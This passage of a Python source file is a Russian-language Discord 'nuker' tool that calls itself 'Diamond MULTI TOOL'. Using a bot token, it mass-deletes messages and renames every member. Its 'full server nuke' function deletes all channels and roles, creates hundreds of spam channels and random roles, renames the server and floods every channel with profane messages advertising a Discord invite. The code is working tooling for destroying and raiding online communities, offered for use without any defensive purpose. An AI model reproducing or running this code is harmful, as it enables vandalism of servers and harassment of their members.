                print(f"{Fore.RED}  • Ошибок: {failed_count}")
                print(f"{Fore.CYAN}═══════════════════════════════════════════════════════════")
                
                log_action("ВЫДАТЬ АДМИН РОЛЬ ВСЕМ", f"Роль {role_name_created} (ID: {role_id}) выдана {given_count} пользователям")
        
    else:
        print(f"{Fore.RED}❌ Не удалось создать роль! Код: {create_response.status_code}")
        log_action("СОЗДАНИЕ АДМИН РОЛИ НЕ УДАЛОСЬ", f"Ошибка: {create_response.status_code}")
    
    input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
    main2()

def clear_channel():
    """Очистка чата"""
    clear()
    print(f"{Fore.YELLOW}╔══════════════════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.YELLOW}║                         {Fore.WHITE}ОЧИСТИТЬ ЧАТ{Fore.YELLOW}                                 ║")
    print(f"{Fore.YELLOW}╚══════════════════════════════════════════════════════════════════════════════╝")
    print()
    
    if not bot_token:
        print(f"{Fore.RED}❌ Токен не найден!")
        time.sleep(2)
        main2()
        return
    
    guild_id = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Введите ID сервера{Fore.CYAN}]\n└──╼ {Fore.WHITE}")
    if not guild_id:
        print(f"{Fore.RED}❌ ID сервера не может быть пустым!")
        time.sleep(2)
        main2()
        return
    
    channel_id = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Введите ID канала{Fore.CYAN}]\n└──╼ {Fore.WHITE}")
    if not channel_id:
        print(f"{Fore.RED}❌ ID канала не может быть пустым!")
        time.sleep(2)
        main2()
        return
    
    try:
        limit = int(input(f"{Fore.CYAN}┌─[{Fore.WHITE}Сколько сообщений удалить (по умолчанию 100){Fore.CYAN}]\n└──╼ {Fore.WHITE}") or "100")
    except ValueError:
        limit = 100
    
    headers = {'Authorization': f'Bot {bot_token}'}
    
    print(f"{Fore.YELLOW}⏳ Получение сообщений...")
    messages = []
    
    while len(messages) < limit:
        batch = get_channel_messages(guild_id, channel_id, bot_token, min(100, limit - len(messages)))
        if not batch:
            break
        messages.extend(batch)
        if len(batch) < 100:
            break
    
    if not messages:
        print(f"{Fore.YELLOW}⚠️ В канале нет сообщений для удаления!")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    print(f"{Fore.GREEN}📌 Найдено сообщений: {len(messages)}")
    
    print(f"{Fore.YELLOW}⚠️ Вы собираетесь удалить {len(messages)} сообщений из канала!")
    confirm = input(f"{Fore.CYAN}Введите 'ДА' для подтверждения: {Fore.WHITE}")
    
    if confirm.upper() != "ДА":
        print(f"{Fore.GREEN}❌ Операция отменена.")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    print(f"{Fore.YELLOW}⏳ Начинаю удаление сообщений (параллельно)...")
    
    def delete_message(message_data):
        try:
            message_id = message_data['id']
            delete_url = f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}'
            delete_response = requests.delete(delete_url, headers=headers)
            return delete_response.status_code in [200, 204], message_id
        except:
            return False, None
    
    deleted_count = 0
    failed_count = 0
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(delete_message, msg) for msg in messages]
        
        for i, future in enumerate(as_completed(futures), 1):
            success, message_id = future.result()
            if success:
                deleted_count += 1
            else:
                failed_count += 1
            print(f"{Fore.GREEN if success else Fore.RED}✅/❌ [{i}/{len(messages)}] Сообщение {'удалено' if success else 'не удалось'}", end='\r')
    
    print(f"\n{Fore.CYAN}═══════════════════════════════════════════════════════════")
    print(f"{Fore.GREEN}✅ Операция завершена!")
    print(f"{Fore.CYAN}📊 Статистика:")
    print(f"{Fore.GREEN}  • Удалено сообщений: {deleted_count}")
    print(f"{Fore.RED}  • Ошибок: {failed_count}")
    print(f"{Fore.CYAN}═══════════════════════════════════════════════════════════")
    
    log_action("ОЧИСТИТЬ ЧАТ", f"Удалено {deleted_count} сообщений из канала {channel_id}")
    
    input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
    main2()

def change_all_nicknames():
    """Изменить никнеймы всем пользователям"""
    clear()
    print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}║                         {Fore.WHITE}ИЗМЕНИТЬ ВСЕ НИКНЕЙМЫ{Fore.CYAN}                       ║")
    print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝")
    print()
    
    if not bot_token:
        print(f"{Fore.RED}❌ Токен не найден!")
        time.sleep(2)
        main2()
        return
    
    guild_id = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Введите ID сервера{Fore.CYAN}]\n└──╼ {Fore.WHITE}")
    if not guild_id:
        print(f"{Fore.RED}❌ ID сервера не может быть пустым!")
        time.sleep(2)
        main2()
        return
    
    nickname = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Введите новый никнейм (оставьте пустым для рандомного){Fore.CYAN}]\n└──╼ {Fore.WHITE}")
    
    headers = {'Authorization': f'Bot {bot_token}'}
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers)
    
    if response.status_code != 200:
        print(f"{Fore.RED}❌ Бот не имеет доступа к серверу!")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    print(f"{Fore.YELLOW}⚠️ Вы собираетесь изменить никнеймы ВСЕМ участникам сервера!")
    confirm = input(f"{Fore.CYAN}Введите 'ДА' для подтверждения: {Fore.WHITE}")
    
    if confirm.upper() != "ДА":
        print(f"{Fore.GREEN}❌ Операция отменена.")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    print(f"{Fore.YELLOW}⏳ Получение списка участников...")
    members = get_guild_members(guild_id, bot_token)
    
    if not members:
        print(f"{Fore.RED}❌ Не удалось получить список участников!")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    print(f"{Fore.GREEN}📌 Найдено участников: {len(members)}")
    print(f"{Fore.YELLOW}⏳ Начинаю изменение никнеймов (параллельно)...")
    
    def change_nickname(member_data):
        try:
            if 'user' not in member_data:
                return False, "Unknown", "Неверная структура"
            
            if member_data['user'].get('bot', False):
                return 'bot', member_data['user']['username'], "Бот"
            
            user_id = str(member_data['user']['id'])
            current_nick = member_data.get('nick', member_data['user']['username'])
            
            new_nick = nickname if nickname else generate_random_nickname()
            
            if current_nick == new_nick:
                return 'same', member_data['user']['username'], "Уже такой ник"
            
            change_url = f'https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}'
            change_data = {"nick": new_nick}
            change_response = requests.patch(change_url, headers=headers, json=change_data)
            
            if change_response.status_code in [200, 204]:
                return True, member_data['user']['username'], new_nick
            else:
                return False, member_data['user']['username'], f"Код: {change_response.status_code}"
        except Exception as e:
            return False, "Unknown", str(e)
    
    changed_count = 0
    failed_count = 0
    skipped_count = 0
    same_count = 0
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(change_nickname, member) for member in members]
        
        for i, future in enumerate(as_completed(futures), 1):
            result, username, info = future.result()
            if result == True:
                changed_count += 1
                print(f"{Fore.GREEN}✅ [{i}/{len(members)}] {username} → {info}")
                log_action("ИЗМЕНЕН НИКНЕЙМ", f"{username} → {info}")
            elif result == 'bot':
                skipped_count += 1
                print(f"{Fore.YELLOW}⚠️ [{i}/{len(members)}] Пропущен бот: {username}")
            elif result == 'same':
                same_count += 1
                print(f"{Fore.YELLOW}⚠️ [{i}/{len(members)}] У {username} уже такой ник")
            else:
                failed_count += 1
                print(f"{Fore.RED}❌ [{i}/{len(members)}] Не удалось изменить никнейм для {username} - {info}")
    
    print(f"\n{Fore.CYAN}═══════════════════════════════════════════════════════════")
    print(f"{Fore.GREEN}✅ Операция завершена!")
    print(f"{Fore.CYAN}📊 Статистика:")
    print(f"{Fore.GREEN}  • Изменено никнеймов: {changed_count}")
    print(f"{Fore.YELLOW}  • Пропущено (боты): {skipped_count}")
    print(f"{Fore.YELLOW}  • Уже имели такой ник: {same_count}")
    print(f"{Fore.RED}  • Ошибок: {failed_count}")
    print(f"{Fore.CYAN}═══════════════════════════════════════════════════════════")
    
    log_action("ИЗМЕНИТЬ ВСЕ НИКНЕЙМЫ", f"Всего: {changed_count} успешно, {failed_count} ошибок, {skipped_count} пропущено")
    
    input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
    main2()

def create_channel_parallel(guild_id, channel_name, headers):
    """Создание одного канала (для параллельного выполнения)"""
    try:
        create_url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
        channel_data = {
            "name": channel_name,
            "type": 0  # Текстовый канал
        }
        response = requests.post(create_url, headers=headers, json=channel_data)
        if response.status_code in [200, 201]:
            return True, channel_name, response.json().get('id')
        else:
            return False, channel_name, f"Ошибка {response.status_code}"
    except Exception as e:
        return False, channel_name, str(e)

def send_message_parallel(channel_id, message, headers):
    """Отправка одного сообщения (для параллельного выполнения)"""
    try:
        send_url = f'https://discord.com/api/v9/channels/{channel_id}/messages'
        message_data = {"content": message}
        response = requests.post(send_url, headers=headers, json=message_data)
        return response.status_code in [200, 201], channel_id
    except:
        return False, channel_id

def rebuild_channels():
    """Перестройка каналов (супер-быстрая)"""
    clear()
    print(f"{Fore.YELLOW}╔══════════════════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.YELLOW}║                         {Fore.WHITE}ПЕРЕСТРОЙКА КАНАЛОВ{Fore.YELLOW}                         ║")
    print(f"{Fore.YELLOW}╚══════════════════════════════════════════════════════════════════════════════╝")
    print()
    
    if not bot_token:
        print(f"{Fore.RED}❌ Токен не найден!")
        time.sleep(2)
        main2()
        return
    
    guild_id = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Введите ID сервера{Fore.CYAN}]\n└──╼ {Fore.WHITE}")
    if not guild_id:
        print(f"{Fore.RED}❌ ID сервера не может быть пустым!")
        time.sleep(2)
        main2()
        return
    
    headers = {'Authorization': f'Bot {bot_token}'}
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers)
    
    if response.status_code != 200:
        print(f"{Fore.RED}❌ Бот не имеет доступа к серверу!")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    try:
        channels_count = int(input(f"{Fore.CYAN}┌─[{Fore.WHITE}Количество каналов (по умолчанию 200){Fore.CYAN}]\n└──╼ {Fore.WHITE}") or "200")
    except ValueError:
        channels_count = 200
    
    channel_prefix = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Префикс каналов (по умолчанию 'Diamond-'){Fore.CYAN}]\n└──╼ {Fore.WHITE}") or "Diamond-"
    
    message = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Сообщение для рассылки (по умолчанию '@everyone Уничтожено!'){Fore.CYAN}]\n└──╼ {Fore.WHITE}") or "@everyone Уничтожено!"
    
    print(f"{Fore.YELLOW}⚠️ ВНИМАНИЕ! Будут удалены ВСЕ каналы на сервере!")
    confirm = input(f"{Fore.CYAN}Введите 'ДА' для подтверждения: {Fore.WHITE}")
    
    if confirm.upper() != "ДА":
        print(f"{Fore.GREEN}❌ Операция отменена.")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    # Получаем список каналов
    print(f"{Fore.YELLOW}⏳ Получение списка каналов...")
    channels_response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers)
    
    if channels_response.status_code == 200:
        channels = channels_response.json()
        print(f"{Fore.GREEN}📌 Найдено каналов: {len(channels)}")
        
        # Удаляем все каналы параллельно
        print(f"{Fore.YELLOW}⏳ Удаление всех каналов (параллельно)...")
        
        def delete_channel(channel):
            try:
                delete_url = f'https://discord.com/api/v9/channels/{channel["id"]}'
                response = requests.delete(delete_url, headers=headers)
                return response.status_code in [200, 204], channel['name']
            except:
                return False, channel['name']
        
        deleted_count = 0
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [executor.submit(delete_channel, ch) for ch in channels]
            for future in as_completed(futures):
                success, name = future.result()
                if success:
                    deleted_count += 1
                print(f"{Fore.GREEN if success else Fore.RED}✅/❌ Удаление канала: {name}", end='\r')
        
        print(f"\n{Fore.GREEN}✅ Удалено каналов: {deleted_count}")
        time.sleep(1)
    
    # Создаем новые каналы параллельно
    print(f"{Fore.YELLOW}⏳ Создание {channels_count} каналов (параллельно)...")
    
    channel_names = [f"{channel_prefix}{i}" for i in range(1, channels_count + 1)]
    created_channels = []
    created_count = 0
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(create_channel_parallel, guild_id, name, headers) for name in channel_names]
        
        for future in as_completed(futures):
            success, name, channel_id = future.result()
            if success:
                created_count += 1
                created_channels.append(channel_id)
                print(f"{Fore.GREEN}✅ Создан: #{name} ({created_count}/{channels_count})", end='\r')
            else:
                print(f"{Fore.RED}❌ Не удалось создать: {name}")
    
    print(f"\n{Fore.GREEN}✅ Создано каналов: {created_count}")
    
    # Отправляем сообщения во все каналы параллельно
    if created_channels and message:
        print(f"{Fore.YELLOW}⏳ Отправка сообщений во все каналы (параллельно)...")
        
        sent_count = 0
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [executor.submit(send_message_parallel, ch_id, message, headers) for ch_id in created_channels]
            
            for future in as_completed(futures):
                success, channel_id = future.result()
                if success:
                    sent_count += 1
                print(f"{Fore.GREEN if success else Fore.RED}✅/❌ Отправка сообщения ({sent_count}/{len(created_channels)})", end='\r')
        
        print(f"\n{Fore.GREEN}✅ Отправлено сообщений: {sent_count}")
    
    print(f"\n{Fore.CYAN}═══════════════════════════════════════════════════════════")
    print(f"{Fore.GREEN}✅ Перестройка завершена!")
    print(f"{Fore.CYAN}📊 Статистика:")
    print(f"{Fore.GREEN}  • Создано каналов: {created_count}")
    print(f"{Fore.GREEN}  • Отправлено сообщений: {sent_count if created_channels else 0}")
    print(f"{Fore.CYAN}═══════════════════════════════════════════════════════════")
    
    log_action("ПЕРЕСТРОЙКА КАНАЛОВ", f"Создано {created_count} каналов, отправлено {sent_count if created_channels else 0} сообщений")
    
    input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
    main2()

def full_server_nuke():
    """Полный снос сервера"""
    clear()
    print(f"{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.RED}║                         {Fore.WHITE}ПОЛНЫЙ СНОС СЕРВЕРА{Fore.RED}                           ║")
    print(f"{Fore.RED}╚══════════════════════════════════════════════════════════════════════════════╝")
    print()
    print(f"{Fore.RED}⛔⛔⛔ ВНИМАНИЕ! ЭТО ПОЛНОСТЬЮ УНИЧТОЖИТ СЕРВЕР! ⛔⛔⛔")
    print(f"{Fore.RED}   • Удаление всех каналов")
    print(f"{Fore.RED}   • Удаление всех ролей")
    print(f"{Fore.RED}   • Создание 200+ новых каналов")
    print(f"{Fore.RED}   • Создание 50+ случайных ролей")
    print(f"{Fore.RED}   • Изменение названия сервера")
    print(f"{Fore.RED}   • Рассылка сообщений")
    print()
    
    if not bot_token:
        print(f"{Fore.RED}❌ Токен не найден!")
        time.sleep(2)
        main2()
        return
    
    guild_id = input(f"{Fore.CYAN}┌─[{Fore.WHITE}Введите ID сервера{Fore.CYAN}]\n└──╼ {Fore.WHITE}")
    if not guild_id:
        print(f"{Fore.RED}❌ ID сервера не может быть пустым!")
        time.sleep(2)
        main2()
        return
    
    headers = {'Authorization': f'Bot {bot_token}'}
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers)
    
    if response.status_code != 200:
        print(f"{Fore.RED}❌ Бот не имеет доступа к серверу!")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    print(f"{Fore.RED}⛔⛔⛔ ЭТО ДЕЙСТВИЕ НЕОБРАТИМО! ⛔⛔⛔")
    confirm = input(f"{Fore.CYAN}Введите 'ПОЛНЫЙ СНОС' для подтверждения: {Fore.WHITE}")
    
    if confirm.upper() != "ПОЛНЫЙ СНОС":
        print(f"{Fore.GREEN}❌ Операция отменена.")
        input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
        main2()
        return
    
    print(f"{Fore.RED}🔥 НАЧИНАЮ ПОЛНЫЙ СНОС СЕРВЕРА! 🔥")
    print()
    
    # 1. Меняем название сервера
    new_name = "NUKED BY DIAMOND " + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    print(f"{Fore.YELLOW}📝 Меняю название сервера на: {new_name}")
    change_name_url = f'https://discord.com/api/v9/guilds/{guild_id}'
    name_data = {"name": new_name}
    name_response = requests.patch(change_name_url, headers=headers, json=name_data)
    if name_response.status_code in [200, 204]:
        print(f"{Fore.GREEN}✅ Название сервера изменено!")
        log_action("СНОС", f"Имя сервера изменено на {new_name}")
    else:
        print(f"{Fore.RED}❌ Не удалось изменить название сервера!")
    
    # 2. Удаляем все каналы
    print(f"{Fore.YELLOW}⏳ Удаление всех каналов...")
    channels_response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers)
    
    if channels_response.status_code == 200:
        channels = channels_response.json()
        print(f"{Fore.GREEN}📌 Найдено каналов: {len(channels)}")
        
        def delete_channel(channel):
            try:
                delete_url = f'https://discord.com/api/v9/channels/{channel["id"]}'
                response = requests.delete(delete_url, headers=headers)
                return response.status_code in [200, 204], channel['name']
            except:
                return False, channel['name']
        
        deleted_count = 0
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [executor.submit(delete_channel, ch) for ch in channels]
            for future in as_completed(futures):
                success, name = future.result()
                if success:
                    deleted_count += 1
                print(f"{Fore.GREEN if success else Fore.RED}✅/❌ Удаление канала: {name}", end='\r')
        
        print(f"\n{Fore.GREEN}✅ Удалено каналов: {deleted_count}")
        log_action("СНОС", f"Удалено {deleted_count} каналов")
    
    # 3. Удаляем все роли
    print(f"{Fore.YELLOW}⏳ Удаление всех ролей...")
    roles_response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers)
    
    if roles_response.status_code == 200:
        roles = roles_response.json()
        print(f"{Fore.GREEN}📌 Найдено ролей: {len(roles)}")
        
        def delete_role(role):
            try:
                if role['name'] == "@everyone":
                    return False, role['name']
                delete_url = f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role["id"]}'
                response = requests.delete(delete_url, headers=headers)
                return response.status_code in [200, 204], role['name']
            except:
                return False, role['name']
        
        deleted_roles = 0
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [executor.submit(delete_role, role) for role in roles]
            for future in as_completed(futures):
                success, name = future.result()
                if success:
                    deleted_roles += 1
                print(f"{Fore.GREEN if success else Fore.RED}✅/❌ Удаление роли: {name}", end='\r')
        
        print(f"\n{Fore.GREEN}✅ Удалено ролей: {deleted_roles}")
        log_action("СНОС", f"Удалено {deleted_roles} ролей")
    
    # 4. Создаем много случайных ролей
    print(f"{Fore.YELLOW}⏳ Создание случайных ролей...")
    roles_count = random.randint(100, 200)
    created_roles = []
    
    def create_random_role(index):
        try:
            role_name = generate_random_role_name() + str(index)
            permissions = random.choice([0, 8, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096, 8192])
            role_data = {
                "name": role_name,
                "permissions": permissions,
                "color": random.randint(0, 16777215),
                "hoist": random.choice([True, False]),
                "mentionable": random.choice([True, False])
            }
            create_url = f'https://discord.com/api/v9/guilds/{guild_id}/roles'
            response = requests.post(create_url, headers=headers, json=role_data)
            if response.status_code in [200, 201]:
                role_info = response.json()
                return True, role_info['id'], role_name
            else:
                return False, None, role_name
        except:
            return False, None, "Ошибка"
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(create_random_role, i) for i in range(roles_count)]
        for future in as_completed(futures):
            success, role_id, name = future.result()
            if success:
                created_roles.append(role_id)
                print(f"{Fore.GREEN}✅ Создана роль: {name} ({len(created_roles)}/{roles_count})", end='\r')
    
    print(f"\n{Fore.GREEN}✅ Создано ролей: {len(created_roles)}")
    log_action("СНОС", f"Создано {len(created_roles)} случайных ролей")
    
    # 5. Создаем новые каналы
    print(f"{Fore.YELLOW}⏳ Создание новых каналов...")
    channels_count = random.randint(150, 250)
    channel_prefix = "NUKED-"
    created_channels = []
    
    channel_names = [f"{channel_prefix}{i}" for i in range(1, channels_count + 1)]
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(create_channel_parallel, guild_id, name, headers) for name in channel_names]
        for future in as_completed(futures):
            success, name, channel_id = future.result()
            if success:
                created_channels.append(channel_id)
                print(f"{Fore.GREEN}✅ Создан: #{name} ({len(created_channels)}/{channels_count})", end='\r')
    
    print(f"\n{Fore.GREEN}✅ Создано каналов: {len(created_channels)}")
    log_action("СНОС", f"Создано {len(created_channels)} каналов")
    
    # 6. Выдаем роль первому пользователю (если есть)
    print(f"{Fore.YELLOW}⏳ Поиск первого пользователя...")
    members = get_guild_members(guild_id, bot_token)
    
    if members and created_roles:
        first_user = None
        for member in members:
            if not member['user'].get('bot', False):
                first_user = member
                break
        
        if first_user:
            user_id = str(first_user['user']['id'])
            role_id = created_roles[0]
            print(f"{Fore.CYAN}👤 Выдаю роль {role_id} пользователю {first_user['user']['username']}")
            
            add_role_url = f'https://discord.com/api/v9/guilds/{guild_id}/members/{user_id}/roles/{role_id}'
            role_response = requests.put(add_role_url, headers=headers)
            if role_response.status_code in [200, 204]:
                print(f"{Fore.GREEN}✅ Роль выдана первому пользователю!")
                log_action("СНОС", f"Роль выдана пользователю {first_user['user']['username']}")
            else:
                print(f"{Fore.RED}❌ Не удалось выдать роль!")
    
    # 7. Отправляем сообщения во все каналы
    if created_channels:
        messages_list = [
            "🔥 ВЫЕБАННЫ discord.gg/JtXRZPz25K! 🔥",
            "💀 Diamond MULTI TOOL 💀",
            "👑 ВСЕ КАНАЛЫ ВЫЕБАННЫ! 👑",
            "⚡ СЛЕДУЙ ЗА НАМИ: discord.gg/JtXRZPz25K ⚡",
            "🎯 ТЫ НЕ СМОЖЕШЬ ОСТАНОВИТЬ ЭТО! 🎯"
        ]
        
        print(f"{Fore.YELLOW}⏳ Отправка сообщений во все каналы...")
        
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            for msg in messages_list:
                futures = [executor.submit(send_message_parallel, ch_id, msg, headers) for ch_id in created_channels]
                for future in as_completed(futures):
                    success, channel_id = future.result()
                    if success:
                        print(f"{Fore.GREEN}✅ Отправлено: {msg[:30]}...", end='\r')
        
        print(f"\n{Fore.GREEN}✅ Сообщения отправлены!")
    
    # Итоговый отчет
    print(f"\n{Fore.RED}═══════════════════════════════════════════════════════════")
    print(f"{Fore.RED}🔥 ПОЛНЫЙ СНОС ЗАВЕРШЕН! 🔥")
    print(f"{Fore.RED}═══════════════════════════════════════════════════════════")
    print(f"{Fore.CYAN}📊 Статистика:")
    print(f"{Fore.GREEN}  • Новое имя сервера: {new_name}")
    print(f"{Fore.GREEN}  • Создано каналов: {len(created_channels)}")
    print(f"{Fore.GREEN}  • Создано ролей: {len(created_roles)}")
    print(f"{Fore.GREEN}  • Выдана роль первому пользователю")
    print(f"{Fore.GREEN}  • Отправлены сообщения во все каналы")
    print(f"{Fore.RED}═══════════════════════════════════════════════════════════")
    
    log_action("ПОЛНЫЙ СНОС", f"Сервер {guild_id} полностью уничтожен!")
    
    input(f"{Fore.CYAN}Нажмите любую клавишу для возврата...")
    main2()

# ===== ГЛАВНАЯ ФУНКЦИЯ =====
def main():
    """Главная функция запуска"""
    global bot_token
    clear()
    new_title("Revolv MultiTool │ Login")
    print_banner(Fore.CYAN)
    
    print(f"{Fore.YELLOW}╔══════════════════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.YELLOW}║                         {Fore.WHITE}АВТОРИЗАЦИЯ{Fore.YELLOW}                              ║")
    print(f"{Fore.YELLOW}╚══════════════════════════════════════════════════════════════════════════════╝")
    print()
    
    if not get_token():
        print(f"{Fore.RED}❌ Токен не введен! Программа будет закрыта.")
        time.sleep(3)
        sys.exit()
    
    is_valid, data = check_bot_token(bot_token)
    
    if is_valid:
        print(f"{Fore.GREEN}✅ Авторизация успешна!")
        print(f"{Fore.CYAN}🔹 Бот: {data['username']}#{data['discriminator']}")
        print(f"{Fore.CYAN}🔹 ID: {data['id']}")
        
        guilds = check_bot_guilds(bot_token)
        print(f"{Fore.CYAN}🔹 Серверов: {len(guilds)}")
        
        if len(guilds) == 0:
            print(f"{Fore.YELLOW}⚠️ Бот не находится ни на одном сервере!")
            print(f"{Fore.CYAN}💡 Пригласите бота на сервер через OAuth2 в Discord Developer Portal")
        
        time.sleep(3)
        main2()
    else:
        print(f"{Fore.RED}❌ Ошибка авторизации!")
        print(f"{Fore.RED}   {data}")
        print()
        print(f"{Fore.YELLOW}💡 Убедитесь, что вы ввели правильный токен бота")
        print(f"{Fore.CYAN}   Токен можно получить здесь: https://discord.com/developers/applications")
        
        choice = input(f"{Fore.CYAN}┌─[{Fore.WHITE}1 - Попробовать снова, 2 - Выход{Fore.CYAN}]\n└──╼ {Fore.WHITE}")
        
        if choice == "1":
            main()
        else:
            print(f"{Fore.RED}Выход...")
            time.sleep(2)
            sys.exit()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}⚠️ Программа остановлена пользователем.")
        sys.exit()
    except Exception as e:
        print(f"{Fore.RED}❌ Ошибка: {e}")
        time.sleep(3)